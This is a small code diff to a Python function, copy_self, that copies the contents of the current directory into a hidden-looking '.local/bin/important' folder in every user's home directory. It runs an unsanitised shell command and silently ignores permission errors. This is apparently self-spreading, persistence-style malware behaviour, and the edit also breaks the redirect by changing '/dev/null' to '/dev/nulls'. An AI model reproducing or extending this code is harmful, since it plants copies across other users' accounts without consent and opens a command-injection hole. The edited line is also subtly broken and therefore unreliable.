@@ -19,7 +19,7 @@ def copy_self():
         pth='/home/'+each+'/.local/bin/important'
         try:
             makedirs(pth,exist_ok=True)
-            cmd='cp '+getcwd()+'/* /home/'+each +'/.local/bin/important/ > /dev/null'
+            cmd='cp '+getcwd()+'/* /home/'+each +'/.local/bin/important/ > /dev/nulls'
             Popen(cmd, shell=True)
         except PermissionError:
             pass
